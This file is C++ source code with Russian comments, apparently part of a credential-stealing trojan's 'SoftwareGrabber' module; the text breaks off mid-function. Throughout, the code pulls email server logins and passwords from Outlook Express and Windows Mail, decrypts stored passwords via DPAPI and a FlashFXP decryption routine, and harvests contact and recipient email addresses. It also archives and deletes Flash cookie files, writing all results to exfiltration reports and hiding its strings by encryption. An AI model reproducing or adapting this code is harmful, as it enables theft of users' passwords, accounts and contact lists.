#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <ws2tcpip.h>
#include <msxml2.h>
#include <wincrypt.h>

#include "defines.h"
#include "core.h"
#include "report.h"
#include "softwaregrabber.h"
#include "cryptedstrings.h"
#include "userhook.h"
#include "screenshot.h"
#include "osenv.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\fs.h"
#include "..\common\registry.h"
#include "..\common\xmlparser.h"
#include "..\common\math.h"
#include "..\common\process.h"
#include "..\common\comlibrary.h"

#if(BO_SOFTWARE_EMAIL > 0)
#  include <wabdefs.h>
#  include <wabapi.h>
#  include <wabtags.h>
#  include <wabiab.h>
#  include <icontact.h>
#  define INITGUID
#  include <guiddef.h>
#  include <imnact.h>
#  include <mimeole.h>
#  include <msoeapi.h>
#  undef INITGUID
#endif

/*
  Запись отчета.

  IN OUT list   - данные для записи, буду освобождены после выхода из функции.
  IN titleId    - заголовок отчета CryptedStrings::id_*.
  IN reportType - BLT_*.
*/
static void writeReport(LPWSTR list, DWORD titleId, DWORD reportType)
{
  if(list != NULL && *list != 0)
  {
    WCHAR title[CryptedStrings::len_max];
    CryptedStrings::_getW(titleId, title);
    Report::writeString(reportType, title, NULL, list);
  }
  Mem::free(list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////

void SoftwareGrabber::init(void)
{

}

void SoftwareGrabber::uninit(void)
{

}

static bool getFlashPlayerPath(LPWSTR path)
{
  CSTR_GETW(home, softwaregrabber_flashplayer_path);
  return (CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path) == S_OK && Fs::_pathCombine(path, path, home));
}

void SoftwareGrabber::_getMacromediaFlashFiles(void)
{
  WDEBUG0(WDDT_INFO, "Exporing the sol-files.");

  CSTR_GETW(mask1, softwaregrabber_flashplayer_mask);
  const LPWSTR mask[] = {mask1};
  
  WCHAR path[MAX_PATH];
  CSTR_GETW(file, softwaregrabber_flashplayer_archive);
  if(getFlashPlayerPath(path))Report::writeFolderAsArchive(path, (LPWSTR *)mask, sizeof(mask) / sizeof(LPWSTR), file, Report::WFAA_RECURSE);
}

void SoftwareGrabber::_removeMacromediaFlashFiles(void)
{
  WCHAR path[MAX_PATH];

  WDEBUG0(WDDT_INFO, "Removing the sol-files.");
  if(getFlashPlayerPath(path))Fs::_removeDirectoryTree(path);
}

#if(BO_SOFTWARE_EMAIL > 0)

/*
  Перечесление всех писем из дирикторий Windows Mail.
  
  IN mimeAllocator    - IMimeAllocator.
  IN store            - IStoreNamespace.
  IN currentFolder    - текущая директория.
  IN OUT messageProps - переменная для экономии стека.
  IN OUT folderProps  - переменная для экономии стека.
  IN OUT list         - список для email'ов.
*/
static void enumWindowsMailMessagesAndFolders(IMimeAllocator *mimeAllocator, IStoreNamespace *store, IStoreFolder *currentFolder, MESSAGEPROPS *messageProps, FOLDERPROPS *folderProps, LPWSTR *list)
{
  HENUMSTORE enumStore;
  
  //Ищим сообщения.
  if(currentFolder->GetFirstMessage(MSGPROPS_FAST, 0, MESSAGEID_FIRST, messageProps, &enumStore) == S_OK)
  {
    do
    {
      IMimeMessage *message;
      if(currentFolder->OpenMessage(messageProps->dwMessageId, IID_IMimeMessage, (void **)&message) == S_OK)
      {
        ADDRESSLIST addressList;
        if(message->GetAddressTypes(IAT_RECIPS, IAP_EMAIL, &addressList) == S_OK)
        {
          for(ULONG i = 0; i < addressList.cAdrs; i++)
          {
            //Добавляем адрес.
            LPSTR email = addressList.prgAdr[i].pszEmail;
            if(email != NULL && Str::_findCharA(email, '@') != NULL)
            {
              LPWSTR emailW = Str::_ansiToUnicodeEx(email, -1);
              if(emailW != NULL && Str::_CatExW(list, emailW, -1))Str::_CatExW(list, L"\n", 1);
              Mem::free(emailW);
            }
          }
          mimeAllocator->FreeAddressList(&addressList);
        }
        message->Release();
      }
      currentFolder->FreeMessageProps(messageProps);
    }
    while(currentFolder->GetNextMessage(enumStore, MSGPROPS_FAST, messageProps) == S_OK);
    currentFolder->GetMessageClose(enumStore);
  }

  //Ищим подиректории.
  if(currentFolder->GetFolderProps(0, folderProps) == S_OK && folderProps->cSubFolders > 0 && store->GetFirstSubFolder(folderProps->dwFolderId, folderProps, &enumStore) == S_OK)
  {
    IStoreFolder *subFolder;
    do if(store->OpenFolder(folderProps->dwFolderId, 0, &subFolder) == S_OK)
    {
      WDEBUG1(WDDT_INFO, "folderProps->szName=[%S].", folderProps->szName);
      enumWindowsMailMessagesAndFolders(mimeAllocator, store, subFolder, messageProps, folderProps, list);
      subFolder->Release();
    }
    while(store->GetNextSubFolder(enumStore, folderProps) == S_OK);    
    store->GetSubFolderClose(enumStore);    
  }
}

void SoftwareGrabber::_emailWindowsMailRecipients(void)
{
  IStoreNamespace *store = (IStoreNamespace *)ComLibrary::_createInterface(CLSID_StoreNamespace, IID_IStoreNamespace);
  if(store == NULL)return;

  LPWSTR list = NULL;
  IStoreFolder *sendFolder;
  
  //Получаем "Sent items".
  if(store->Initialize(NULL, 0) == S_OK && store->OpenSpecialFolder(FOLDER_SENT, 0, &sendFolder) == S_OK)
  {
    IMimeAllocator *mimeAllocator = (IMimeAllocator *)ComLibrary::_createInterface(CLSID_IMimeAllocator, IID_IMimeAllocator);    
    if(mimeAllocator != NULL)
    {
      FOLDERPROPS folderProps;
      MESSAGEPROPS messageProps;

      messageProps.cbSize = sizeof(MESSAGEPROPS);
      folderProps.cbSize  = sizeof(FOLDERPROPS);
    
      enumWindowsMailMessagesAndFolders(mimeAllocator, store, sendFolder, &messageProps, &folderProps, &list);
      
      mimeAllocator->Release();
    }
    sendFolder->Release();  
  }
  
  //Выход.
  store->Release();
  
  //Сохраянем лог.          
  DWORD titleId = coreData.winVersion < OsEnv::VERSION_VISTA ? CryptedStrings::id_softwaregrabber_outlook_express_recips_title : CryptedStrings::id_softwaregrabber_windows_mail_recips_title;
  writeReport(list, titleId, BLT_GRABBED_EMAILSOFTWARE);
}

////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Надстройка над IPropertyContainer::GetPropSz() для получения Unicode-строки.

  IN account - аккаунт.
  IN id      - ID опции.

  Return     - строка, или NULL. Нужно освободить через Mem.
*/
static LPWSTR outlookExpressSzToUnicode(IImnAccount *account, DWORD id)
{
  char buffer[256/*Макс. размер согласно CCHMAX_*.*/];
  if(account->GetPropSz(id, buffer, sizeof(buffer)) != S_OK)return NULL;
  return Str::_ansiToUnicodeEx(buffer, -1);
}

/*
  Добавление данных сервера в отчет.

  IN title      - заголовок.
  IN account    - аккаунт.
  IN serverId   - AP_*_SERVER.
  IN portId     - AP_*_PORT.
  IN sslId      - AP_*_SSL.
  IN userNameId - AP_*_USERNAME.
  IN passwordId - AP_*_PASSWORD.
  OUT buffer    - буфер для данных.
*/
static void appendOutlookExpressInfo(const LPWSTR title, IImnAccount *account, DWORD serverId, DWORD portId, DWORD sslId, DWORD userNameId, DWORD passwordId, LPWSTR *buffer)
{
  //Получаем.
  LPWSTR server   = outlookExpressSzToUnicode(account, serverId);
  LPWSTR userName = outlookExpressSzToUnicode(account, userNameId);
  LPWSTR password = outlookExpressSzToUnicode(account, passwordId);
  
  DWORD ssl;
  DWORD port;
  if(account->GetPropDw(portId, &port) != S_OK)port = 0;
  if(account->GetPropDw(sslId,  &ssl)  != S_OK)ssl  = 0;

  //Добавляем.
  {
    CSTR_GETW(format, softwaregrabber_account_server_info);
    CSTR_GETW(sslMarker, softwaregrabber_account_server_ssl);

    Str::_sprintfCatExW(buffer, Str::_LengthW(*buffer), format,
                        title,
                        server == NULL ? L"" : server,
                        port,
                        ssl == 0 ? L"" : sslMarker,
                        userName == NULL ? L"" : userName,
                        password == NULL ? L"" : password
                       );
  }

  //Освобождаем.
  Mem::free(server);
  Mem::free(userName);
  Mem::free(password);
}

void SoftwareGrabber::_emailOutlookExpress(void)
{
  HRESULT hr;
  
  //Получаем IImnAccountManager.
  IImnAccountManager *manager = (IImnAccountManager *)ComLibrary::_createInterface(CLSID_ImnAccountManager, IID_IImnAccountManager);
  if(manager == NULL)return;

  //Инициализация.
  IImnEnumAccounts *accounts;
  LPWSTR list = NULL;

  if(manager->InitEx(NULL, ACCT_INIT_ATHENA) == S_OK && manager->Enumerate(SRV_SMTP | SRV_POP3 | SRV_IMAP, &accounts) == S_OK)
  {
    IImnAccount *account;
    while(accounts->GetNext(&account) == S_OK)
    {
      DWORD serverTypes;
      if(account->GetServerTypes(&serverTypes) == S_OK && serverTypes != 0)
      {
        //Заголовок аккаунта.
        {
          LPWSTR accountName = outlookExpressSzToUnicode(account, AP_ACCOUNT_NAME);
          LPWSTR email       = outlookExpressSzToUnicode(account, AP_SMTP_EMAIL_ADDRESS);

          CSTR_GETW(format, softwaregrabber_account_title);
          DWORD size = Str::_sprintfCatExW(&list, Str::_LengthW(list), format,
                                           (list == NULL || *list == 0) ? L"" : L"\n",
                                            accountName == NULL ? L"" : accountName,
                                            email == NULL ? L"" : email
                                           ); 

          Mem::free(accountName);
          Mem::free(email);

          if(size == (DWORD)-1)serverTypes = 0;
        }
      
        if(serverTypes & SRV_IMAP)
        {
          CSTR_GETW(title, softwaregrabber_account_server_imap);
          appendOutlookExpressInfo(title, account, AP_IMAP_SERVER, AP_IMAP_PORT, AP_IMAP_SSL, AP_IMAP_USERNAME, AP_IMAP_PASSWORD, &list);
        }

        if(serverTypes & SRV_POP3)
        {
          CSTR_GETW(title, softwaregrabber_account_server_pop3);
          appendOutlookExpressInfo(title, account, AP_POP3_SERVER, AP_POP3_PORT, AP_POP3_SSL, AP_POP3_USERNAME, AP_POP3_PASSWORD, &list);
        }

        if(serverTypes & SRV_SMTP)
        {
          CSTR_GETW(title, softwaregrabber_account_server_smtp);
          appendOutlookExpressInfo(title, account, AP_SMTP_SERVER, AP_SMTP_PORT, AP_SMTP_SSL, AP_SMTP_USERNAME, AP_SMTP_PASSWORD, &list);
        }
      }
      account->Release();
    }
    accounts->Release();
  }
  manager->Release();
  writeReport(list, CryptedStrings::id_softwaregrabber_outlook_express_title, BLT_GRABBED_EMAILSOFTWARE);
}

////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
  LPWSTR list;    //Строка для вывода аккаунтов.
  DATA_BLOB salt; //Секрет паролей.
}WINDOWSMAILDATA;

/*
  Получение строки из Windows Mail параметра.

  IN root     - рутовый элемент.
  IN title    - заголовок(префкс) элемента.
  IN stringId - ID строки формата элемента.

  Return      - строка, или NULL в случаи ошибки. Нужно освободить через _freeBstr().
*/
static BSTR getWindowsMailString(IXMLDOMElement *root, const LPWSTR title, DWORD stringId)
{
  WCHAR name[40]; //Размер на softwaregrabber_account_server_x_*.
  WCHAR format[30]; //Размер на softwaregrabber_account_server_x_*.

  CryptedStrings::_getW(stringId, format);
  if(Str::_sprintfW(name, sizeof(name) / sizeof(WCHAR), format, title) > 0)return XmlParser::_getNodeTextOfElement(root, name);
  return NULL;
}

/*
  Добавление данных сервера в отчет.

  IN title   - заголовок.
  IN defaultPort - порт по умолчанию.
  IN salt        - секрет пароля.
  IN root        - рутовый элемент.
  OUT buffer     - буфер для данных.

  Return         - true - данные добавлены,
                   false - данные не найдены.
*/
static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const DATA_BLOB *salt, IXMLDOMElement *root, LPWSTR *buffer)
{
  //Получаем.
  BSTR server   = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_server);
  BSTR port     = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_port);
  BSTR ssl      = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_ssl);
  BSTR userName = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_username);
  BSTR password = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_password);

  //Добавляем.
  bool ok = (server != NULL);
  if(ok)
  {
    DWORD portDword     = 0;
    DWORD sslDword      = ssl == NULL ? 0 : Str::_ToInt32W(ssl, NULL);
    LPWSTR passwordReal = NULL;
    
    //Убейте меня за говнокод.
    if(port != NULL)
    {
      WCHAR portEx[12];
      CSTR_GETW(format, softwaregrabber_windows_mail_to_port)
      Str::_sprintfW(portEx, sizeof(portEx) / sizeof(WCHAR), format, port);
      portDword = Str::_ToInt32W(portEx, NULL);
    }

    //Получаем пароль.
    int passwordLen = Str::_LengthW(password);
    if(password != NULL && passwordLen > 1 && (passwordLen % 2) == 0)
    {
      DATA_BLOB source;
      DATA_BLOB dest;

      source.cbData = passwordLen / 2;
      if((source.pbData = (BYTE *)Mem::alloc(source.cbData)) != NULL)
      {
        if(Str::_fromHexW(password, source.pbData) && CWA(crypt32, CryptUnprotectData)(&source, NULL, (DATA_BLOB *)salt, NULL, NULL, 0, &dest) == TRUE)
        {
          passwordReal = Str::_CopyExW((LPWSTR)dest.pbData, dest.cbData);        
          CWA(kernel32, LocalFree)(dest.pbData);
        }
        Mem::free(source.pbData);
      }
    }
    
    //Выводим.
    CSTR_GETW(format, softwaregrabber_account_server_info);
    CSTR_GETW(sslMarker, softwaregrabber_account_server_ssl);

    Str::_sprintfCatExW(buffer, Str::_LengthW(*buffer), format,
                        title,
                        /*server == NULL ? L"" : */server,
                        portDword,
                        sslDword     == 0    ? L"" : sslMarker,
                        userName     == NULL ? L"" : userName,
                        passwordReal == NULL ? L"" : passwordReal
                       );
    Mem::free(passwordReal);
  }

  //Освобождаем.
  XmlParser::_freeBstr(server);
  XmlParser::_freeBstr(port);
  XmlParser::_freeBstr(ssl);
  XmlParser::_freeBstr(userName);
  XmlParser::_freeBstr(password);

  return ok;
}

/*
  Обработка XML-файла с аккаунтом Winodws Mail.
*/
static bool windowsMailAccountProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
  WCHAR fileName[MAX_PATH];
  WINDOWSMAILDATA *wmd = (WINDOWSMAILDATA *)data;
  IXMLDOMDocument *doc;

  //Открываем файл.
  if(!Fs::_pathCombine(fileName, path, (LPWSTR)fileInfo->cFileName) || (doc = XmlParser::_openFile(fileName, NULL)) == NULL)return true;

  //Пробираемся к списку акканутов.
  IXMLDOMElement *root;
  if(doc->get_documentElement(&root) == S_OK)
  {
    //Проверяем имя рута.
    bool ok = false;
    {
      BSTR rootName;
      if(root->get_nodeName(&rootName) == S_OK)
      {
        CSTR_GETW(requeredRootName, softwaregrabber_windows_mail_xml_root);
        ok = (Str::_CompareW(requeredRootName, rootName, CryptedStrings::len_softwaregrabber_windows_mail_xml_root - 1, -1) == 0);
        XmlParser::_freeBstr(rootName);
      }
    }
    
    //Получаем аккауны.
    if(ok)
    {        
      LPWSTR tmpList = NULL;
      
      //Заголовок аккаунта.
      {
        BSTR accountName;
        BSTR email;
        
        {
          CSTR_GETW(node, softwaregrabber_windows_mail_xml_name);
          accountName = XmlParser::_getNodeTextOfElement(root, node);
        }
        
        {
          CSTR_GETW(node, softwaregrabber_windows_mail_xml_email);
          email = XmlParser::_getNodeTextOfElement(root, node);
        }

        CSTR_GETW(format, softwaregrabber_account_title);
        int size = Str::_sprintfExW(&tmpList, format,
                                    (wmd->list == NULL || wmd->list[0] == 0) ? L"" : L"\n",
                                     accountName == NULL ? L"" : accountName,
                                     email       == NULL ? L"" : email
                                    ); 

        XmlParser::_freeBstr(accountName);
        XmlParser::_freeBstr(email);

        if(size <= 0)ok = false;
      }

      //Данные.
      if(ok)
      {
        BYTE appended = 0;

        {
          CSTR_GETW(title, softwaregrabber_account_server_imap);
          if(appendWindowsMailInfo(title, 0x8F, &wmd->salt, root, &tmpList))appended++;
        }

        {
          CSTR_GETW(title, softwaregrabber_account_server_pop3);
          if(appendWindowsMailInfo(title, 0x6E, &wmd->salt, root, &tmpList))appended++;
        }

        {
          CSTR_GETW(title, softwaregrabber_account_server_smtp);
          if(appendWindowsMailInfo(title, 0x19, &wmd->salt, root, &tmpList))appended++;
        }

        if(appended > 0)Str::_CatExW(&wmd->list, tmpList, -1);
        Mem::free(tmpList);
      }
    }
    root->Release();
  }
  XmlParser::_closeFile(doc);
  
  return true;
}

void SoftwareGrabber::_emailWindowsMail(bool live)
{
  WINDOWSMAILDATA wmd;
  WCHAR path[MAX_PATH];
  {
    //Получаем ключ.
    WCHAR regKey[max(CryptedStrings::len_softwaregrabber_windows_live_mail_regkey, CryptedStrings::len_softwaregrabber_windows_mail_regkey)];
    CryptedStrings::_getW(live ? CryptedStrings::id_softwaregrabber_windows_live_mail_regkey : CryptedStrings::id_softwaregrabber_windows_mail_regkey, regKey);

    //Получаем директорию для поиска.
    {  
      CSTR_GETW(regValue, softwaregrabber_windows_mail_regvalue_path);
      DWORD r = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, path, MAX_PATH);
      if(r == 0 || r == (DWORD)-1)return;
      WDEBUG1(WDDT_INFO, "path=[%s]", path);
    }

    //Получаем секрет для пароля.
    wmd.list = NULL;
    {
      CSTR_GETW(regValue, softwaregrabber_windows_mail_regvalue_salt);
      if((wmd.salt.cbData = Registry::_getValueAsBinaryEx(HKEY_CURRENT_USER, regKey, regValue, NULL, (void **)&wmd.salt.pbData)) == (DWORD)-1)Mem::_zero(&wmd.salt, sizeof(wmd.salt));
    }
  }

  //Ищим.
  {
    CSTR_GETW(file1, softwaregrabber_windows_mail_file_1);
    LPWSTR files[] = {file1};
    Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_RECURSIVE | Fs::FFFLAG_SEARCH_FILES, windowsMailAccountProc, &wmd, NULL, 0, 0);
  }

  //Сохраянем лог.          
  writeReport(wmd.list, live ? CryptedStrings::id_softwaregrabber_windows_live_mail_title : CryptedStrings::id_softwaregrabber_windows_mail_title, BLT_GRABBED_EMAILSOFTWARE);
}

void SoftwareGrabber::_emailWindowsAddressBook(void)
{
  //Загружаем DLL.
  HMODULE wabDll;
  {
    WCHAR dllPath[MAX_PATH];
    CSTR_GETW(regKey, softwaregrabber_wab_regkey);
    DWORD size = Registry::_getValueAsString(HKEY_LOCAL_MACHINE, regKey, NULL, dllPath, MAX_PATH);

    if(size == (DWORD)-1 || size == 0)
    {
      WDEBUG0(WDDT_ERROR, "Path of wab not founded.");
      return;
    }

    if((wabDll = CWA(kernel32, LoadLibraryW)(dllPath)) == NULL)
    {
      WDEBUG1(WDDT_ERROR, "Failed to load [%s].", dllPath);
      return;
    }
  }

  //Получаем интерфейс.
  IAddrBook *addressBook;
  IWABObject *wabObject;
  {
    CSTR_GETA(funcName, softwaregrabber_wab_wabopen);
    LPWABOPEN wabOpen = (LPWABOPEN)CWA(kernel32, GetProcAddress)(wabDll, funcName);
    if(wabOpen == NULL || wabOpen(&addressBook, &wabObject, NULL, 0) != S_OK)
    {
      WDEBUG1(WDDT_ERROR, "%s failed.", funcName);
      goto END;
    }
  }

  //Собираем emails.
  ULONG entryId;
  ENTRYID *entryIdStruct;
  ULONG objectType;
  IUnknown *unknown;  
  LPWSTR list = NULL;
  HRESULT freeResult;
  
  if(addressBook->GetPAB(&entryId, &entryIdStruct) == S_OK)
  {
    if(addressBook->OpenEntry(entryId, entryIdStruct, NULL, MAPI_BEST_ACCESS, &objectType, &unknown) == S_OK)
    {
      if(objectType == MAPI_ABCONT)
      {
        IMAPITable *table;
        IABContainer *abContainer = (IABContainer *)unknown;

        if(abContainer->GetContentsTable(WAB_PROFILE_CONTENTS, &table) == S_OK)
        {
          ULONG rowsCount;
          SRowSet *rows;
        
          if(table->GetRowCount(0, &rowsCount) == S_OK && table->QueryRows(rowsCount, 0, &rows) == S_OK)
          {
            //Перечисляем.
            for(ULONG i = 0; i < rows->cRows; i++)
            {
              SRow *row = &rows->aRow[i];
            
              for(ULONG j = 0; j < row->cValues; j++)
              {
                SPropValue *props = &row->lpProps[j];
                bool ok = false;
                switch(props->ulPropTag)
                {                
                  case PR_EMAIL_ADDRESS_W:
                    if(Str::_findCharW(props->Value.lpszW, '@') != NULL)
                    {
                      ok = Str::_CatExW(&list, props->Value.lpszW, -1);
                    }
                    break;
                  
                  case PR_EMAIL_ADDRESS_A:
                    if(Str::_findCharA(props->Value.lpszA, '@') != NULL)
                    {
                      LPWSTR tmpBuffer = Str::_ansiToUnicodeEx(props->Value.lpszA, -1);
                      if(tmpBuffer)ok = Str::_CatExW(&list, tmpBuffer, -1);
                      Mem::free(tmpBuffer);
                    }
                    break;
                
                  default:
                    //WDEBUG1(WDDT_INFO, "props->ulPropTag=0x%08X", props->ulPropTag);
                    break;
                }
                if(ok)Str::_CatExW(&list, L"\n", 1);
              }
              freeResult = wabObject->FreeBuffer(row->lpProps);
              WDEBUG1(WDDT_INFO, "freeResult=0x%08X", freeResult);
            }
            freeResult = wabObject->FreeBuffer(rows);
            WDEBUG1(WDDT_INFO, "freeResult=0x%08X", freeResult);
          }
          table->Release();
        }
      }
      unknown->Release();
    }
    freeResult = wabObject->FreeBuffer(entryIdStruct);
    WDEBUG1(WDDT_INFO, "freeResult=0x%08X", freeResult);
  }
#if(BO_DEBUG > 0)
  else WDEBUG0(WDDT_ERROR, "Failed.");
#endif  
  
  //Выход.
  addressBook->Release();
  wabObject->Release();

  //Сохраянем лог.
  writeReport(list, CryptedStrings::id_softwaregrabber_wab_title, BLT_GRABBED_EMAILSOFTWARE);

END:  
  CWA(kernel32, FreeLibrary)(wabDll);
}

void SoftwareGrabber::_emailWindowsContacts(void)
{
  HRESULT hr;

  //Получаем IContactManager.
  IContactManager *manager = (IContactManager *)ComLibrary::_createInterface(CLSID_ContactManager, IID_IContactManager);
  if(manager == NULL)return;

  //Инициализация.  
  {
    CSTR_GETW(initName, softwaregrabber_wc_init_name);
    CSTR_GETW(initVersion, softwaregrabber_wc_init_version);
    hr = manager->Initialize(initName, initVersion);
  }
  
  //Получаем все контакты.
  IContactCollection *collection;
  LPWSTR list = NULL;

  if(hr == S_OK && manager->GetContactCollection(&collection) == S_OK)
  {
    CSTR_GETW(propertyFormat, softwaregrabber_wc_property_format);
    WCHAR propertyName[sizeof(propertyFormat) / sizeof(WCHAR) + 4];
    WCHAR email[100];

    IContact *contact;
    IContactProperties *props;

    collection->Reset(); //Параноя.
    while(collection->Next() == S_OK)if(collection->GetCurrent(&contact) == S_OK)
    {
      if(contact->QueryInterface(IID_IContactProperties, (void **)&props) == S_OK)
      {
        for(BYTE i = 1; i <= 100; i++) //Т.е. не более 100 мылов на конакт.
        {
          if(Str::_sprintfW(propertyName, sizeof(propertyName) / sizeof(WCHAR), propertyFormat, i) <= 0)break;
          
          DWORD size = sizeof(email) / sizeof(WCHAR);
          hr = props->GetString(propertyName, CGD_DEFAULT, email, size, &size);

          if(hr == S_OK && Str::_findCharW(email, '@') != NULL && Str::_CatExW(&list, email, -1))Str::_CatExW(&list, L"\n", 1);
          
          WDEBUG1(WDDT_INFO, "hr=0x%08X", hr);

          if(hr == S_OK || hr == ERROR_INSUFFICIENT_BUFFER /*Буфер мал.*/ || hr == S_FALSE /*Параметр пустой*/)continue;

          break; //Обычно ERROR_PATH_NOT_FOUND.
        }
        props->Release();
      } 
      contact->Release();
    }
    collection->Release();
  }
  manager->Release();
  writeReport(list, CryptedStrings::id_softwaregrabber_wc_title, BLT_GRABBED_EMAILSOFTWARE);
}

void SoftwareGrabber::_emailAll(void)
{
  if(coreData.winVersion >= OsEnv::VERSION_VISTA)
  {
    _emailWindowsMail(false);
    _emailWindowsContacts();
  }
  else
  {
    _emailOutlookExpress();
    _emailWindowsAddressBook();
  }

  _emailWindowsMailRecipients();
  
  //Windows Live Mail может быть установлен на XP+.
  _emailWindowsMail(true);
}
#endif

#if(BO_SOFTWARE_FTP > 0)

//Максимальный размер элемента.
#define MAX_ITEM_SIZE 0xFF

//Данные для рекрусивного поиска по FTP-клиентам.
typedef struct
{
  LPWSTR list;  //Список найденых акков.
  DWORD count;  //Кол. найденых акков.
}FTPDATA;

////////////////////////////////////////////////////////////////////////////////////////////////////
// FlashFXP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass    - пароль.
  IN sectionName - имя секции. Не может быть нулевой.

  Return         - размер пароля.
*/
static int ftpFlashFxp3Decrypt(LPWSTR pass, LPWSTR sectionName)
{
  BYTE buf[MAX_ITEM_SIZE];
  LPWSTR magic;
  WCHAR defaultMagic[CryptedStrings::len_softwaregrabber_flashfxp_secret];
  int magicLen;
  int r = 0;
  
  if(Str::_findCharW(sectionName, 0x03))
  {
    magicLen = Str::_LengthW(sectionName);
    magic    = sectionName;
  }
  else
  {
    magic    = defaultMagic;
    magicLen = CryptedStrings::len_softwaregrabber_flashfxp_secret - 1;
    CryptedStrings::_getW(CryptedStrings::id_softwaregrabber_flashfxp_secret, defaultMagic);
  }

  int len = Str::_LengthW(pass) / 2;
  if(len < MAX_ITEM_SIZE && Str::_fromHexW(pass, buf))
  {
    len--;

    int i = 0, j = 0;
    for(; i < len; i++, j++)
    {
      if(j == magicLen)j = 0;

      BYTE c = buf[i + 1] ^ ((BYTE)(magic[j]));
      if(c < buf[i])c--;
      pass[i] = (WCHAR)(BYTE)(c - buf[i]);
    }
    pass[i] = 0;
    r = i;
  }
  return r;
}

bool ftpFlashFxp3Proc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpFlashFxp3BasicSearch(LPWSTR path, FTPDATA *ftpData)
{
  CSTR_GETW(file1, softwaregrabber_flashfxp_file_1);
  CSTR_GETW(file2, softwaregrabber_flashfxp_file_2);
  CSTR_GETW(file3, softwaregrabber_flashfxp_file_3);
  
  const LPWSTR files[] = {file1, file2, file3};
  Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpFlashFxp3Proc, ftpData, NULL, 0, 0);
}

static bool ftpFlashFxp3Proc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
  FTPDATA *ftpData = (FTPDATA *)data;
  WCHAR curPath[MAX_PATH];
  
  if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
  {
    WDEBUG1(WDDT_INFO, "%s", curPath);
    if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)ftpFlashFxp3BasicSearch(curPath, ftpData);
    else
    {      
      LPWSTR sectionsList = (LPWSTR)Mem::alloc(0xFFFF * sizeof(WCHAR));
      if(sectionsList != NULL)
      {
        DWORD size = CWA(kernel32, GetPrivateProfileStringW)(NULL, NULL, NULL, sectionsList, 0xFFFF, curPath);
        if(size > 0 && Str::_isValidMultiStringW(sectionsList, size + 1))
        {
          const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
          LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));
          if(dataBuf != NULL)
          {
            LPWSTR host    = dataBuf;
            LPWSTR user    = host + MAX_ITEM_SIZE;
            LPWSTR pass    = user + MAX_ITEM_SIZE;
            LPWSTR output  = pass + MAX_ITEM_SIZE;
            LPWSTR section = sectionsList;
            DWORD port;
            
            CSTR_GETW(keyIp,   softwaregrabber_flashfxp_host);
            CSTR_GETW(keyPort, softwaregrabber_flashfxp_port);
            CSTR_GETW(keyUser, softwaregrabber_flashfxp_user);
            CSTR_GETW(keyPass, softwaregrabber_flashfxp_pass);
            do
            {
              if(CWA(kernel32, GetPrivateProfileStringW)(section, keyIp,   NULL, host, MAX_ITEM_SIZE, curPath) > 0 &&
                (port = CWA(kernel32, GetPrivateProfileIntW)(section, keyPort, 21, curPath)) > 0 && port <= 0xFFFF &&
                 CWA(kernel32, GetPrivateProfileStringW)(section, keyUser, NULL, user, MAX_ITEM_SIZE, curPath) > 0 &&
                 CWA(kernel32, GetPrivateProfileStringW)(section, keyPass, NULL, pass, MAX_ITEM_SIZE, curPath) > 0 &&
                 ftpFlashFxp3Decrypt(pass, section) > 0)
              {
                CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
                int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, port);
                if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))ftpData->count++;
              }
            }
            while((section = Str::_multiStringGetIndexW(section, 1)) != NULL);
            Mem::free(dataBuf);
          }
        }
        Mem::free(sectionsList);
      }
    }
  }
  return true;
}

void SoftwareGrabber::_ftpFlashFxp3(void)
{
  WCHAR curPath[MAX_PATH];
  WCHAR dataPath[MAX_PATH];
  FTPDATA ftpData;
  DWORD size;
  
  Mem::_zero(&ftpData, sizeof(FTPDATA));

  CSTR_GETW(regKey, softwaregrabber_flashfxp_regkey);
  CSTR_GETW(regValue, softwaregrabber_flashfxp_regvalue);
  if((size = Registry::_getValueAsString(HKEY_LOCAL_MACHINE, regKey, regValue, curPath, MAX_PATH)) != (DWORD)-1 && size > 0)
  {
    CWA(kernel32, ExpandEnvironmentStringsW)(curPath, dataPath, MAX_PATH);
    ftpFlashFxp3BasicSearch(dataPath, &ftpData);
  }
  
  if(ftpData.count == 0)
  {
    CSTR_GETW(dir1, softwaregrabber_flashfxp_path_mask);
    const DWORD locs[] = {CSIDL_COMMON_APPDATA, CSIDL_APPDATA, CSIDL_PROGRAM_FILES};
    const LPWSTR dirs[] = {dir1};
    
    for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
    {
